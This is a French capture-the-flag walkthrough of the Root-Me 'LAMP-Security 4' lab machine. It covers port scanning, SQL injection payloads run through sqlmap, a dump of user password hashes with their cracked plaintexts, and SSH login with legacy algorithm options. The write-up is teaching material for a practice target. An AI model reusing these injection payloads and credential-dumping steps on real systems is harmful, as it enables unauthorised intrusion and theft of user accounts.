# LAMP-SECURITY 4

## Avant de commencer
Le nom du challenge donne déjà pas mal d'informations sur le type de serveur que l'on va attaquer.<br>
Un serveur LAMP pour Linux Apache Mysql et PHP, une application web est donc hébergé.

## Trouver IPv4 de la machine 

ping -c 3 ctf26.root-me.org<br>

## Scan des ports pour trouver service(s) vulnérable(s)

nmap -Pn -v 163.172.228.192<br>

PORT    STATE  SERVICE<br>
22/tcp  open   ssh<br>
80/tcp  open   http<br>
631/tcp closed ipp<br>

Le résulat du scan confirme qu'un application web tourne sur le serveur en + d'un service ssh, nous pourrons peut-être de tenter de le bruteforcer par la suite<br>

## Visite de la page WEB sur le port 80

url : 163.172.228.192:80

## Attaque par SQLI (SQL Injection)

163.172.228.192:80/page=blog&title=Blog&id=2 AND 1=1 est vulnérable<br>

### Utilisation de SQLMap

sqlmap -u http://163.172.228.192/index.html\?page=blog\&title=Blog\&id=2 --dbs<br>

Parameter: id (GET)<br>
Type: boolean-based blind<br>
Title: AND boolean-based blind - WHERE or HAVING clause<br>
Payload: page=blog&title=Blog&id=2 AND 6651=6651<br>

Type: time-based blind<br>
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)<br>
Payload: page=blog&title=Blog&id=2 AND (SELECT 5196 FROM (SELECT(SLEEP(5)))NtzK)<br>

Type: UNION query<br>
Title: Generic UNION query (NULL) - 5 columns<br>
Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,CONCAT(0x717a717171,0x544a6159597a5a414e6c67494d6369446a786c556371497745796f5458545645556375495)<br>

[16:26:25] [INFO] the back-end DBMS is MySQL<br>
web server operating system: Linux Fedora 5 (Bordeaux)<br>
web application technology: PHP 5.1.2, Apache 2.2.0<br>
back-end DBMS: MySQL >= 5.0.12<br>
[16:26:25] [INFO] fetching database names<br>
available databases [5]:<br>
[*] ehks<br>
[*] information_schema<br>
[*] mysql<br>
[*] roundcubemail<br>
[*] test<br>

sqlmap -u http://163.172.228.192/index.html\?page=blog\&title=Blog\&id=2 -D ehks --dump<br>

+---------+-----------+--------------------------------------------------+<br>
| user_id | user_name | user_pass                                        |<br>
+---------+-----------+--------------------------------------------------+<br>
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |<br>
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |<br>
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |<br>
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |<br>
| 5       | sorzek    | e0a23947029316880c29e8533d8662a3 (convertible)   |<br>
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |<br>
+---------+-----------+--------------------------------------------------+<br>

ssh jdurbin@163.172.228.192<br>
Unable to negotiate with 163.172.228.192 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1<br>

ssh jdurbin@163.172.228.192 -oKexAlgorithms=diffie-hellman-group-exchange-sha1<br>
Unable to negotiate with 163.172.228.192 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss<br>

ssh jdurbin@163.172.228.192 -oKexAlgorithms=diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=ssh-rsa<br>
jdurbin@163.172.228.192's password: Sue1978<br>
Last login: Mon Mar  9 11:07:09 2009 from 192.168.0.50<br>
[jdurbin@ctf ~]$<br>



